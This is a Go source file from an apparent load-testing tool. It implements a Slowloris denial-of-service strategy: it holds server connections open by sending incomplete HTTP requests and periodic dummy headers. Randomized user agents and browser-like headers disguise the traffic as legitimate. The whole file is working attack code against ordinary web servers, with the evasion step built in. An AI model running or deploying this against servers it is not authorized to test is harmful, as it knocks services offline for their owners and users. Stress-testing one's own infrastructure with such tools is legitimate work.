package strategy

import (
	"context"
	"time"

	"github.com/jdw/loadtestforge/internal/config"
	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// Slowloris implements the Slowloris attack with browser mimicry.
// It sends incomplete HTTP requests with Connection: keep-alive header
// to appear as a legitimate browser while holding server connections.
type Slowloris struct {
	BaseStrategy
}

// NewSlowloris creates a new Slowloris strategy with the given keep-alive interval.
func NewSlowloris(keepAliveInterval time.Duration, bindIP string) *Slowloris {
	common := DefaultCommonConfig()
	common.KeepAliveInterval = keepAliveInterval
	return &Slowloris{
		BaseStrategy: NewBaseStrategy(bindIP, common),
	}
}

// NewSlowlorisWithConfig creates a Slowloris strategy from StrategyConfig.
func NewSlowlorisWithConfig(cfg *config.StrategyConfig, bindIP string) *Slowloris {
	return &Slowloris{
		BaseStrategy: NewBaseStrategyFromConfig(cfg, bindIP),
	}
}

func (s *Slowloris) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.GetConnConfig(), &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	// Record connection start
	s.RecordConnectionStart(connID, mc.RemoteAddr().String())

	userAgent := httpdata.RandomUserAgent()

	// Send incomplete HTTP request with browser-like headers
	incompleteRequest := s.GetHeaderRandomizer().BuildIncompleteRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(incompleteRequest), config.DefaultWriteTimeout); err != nil {
		s.RecordTimeout()
		return err
	}

	// Record initial success
	s.RecordLatency(time.Since(startTime))

	ticker := time.NewTicker(s.GetKeepAliveInterval())
	defer ticker.Stop()

	for {
		select {
		case <-mc.Context().Done():
			s.RecordConnectionEnd(connID)
			return nil
		case <-ticker.C:
			header := httpdata.GenerateDummyHeader()
			if _, err := mc.WriteWithTimeout([]byte(header), config.DefaultWriteTimeout); err != nil {
				s.RecordTimeout()
				s.RecordConnectionEnd(connID)
				return err
			}
			// Record activity
			s.RecordConnectionActivity(connID)
		}
	}
}

func (s *Slowloris) Name() string {
	return "slowloris"
}
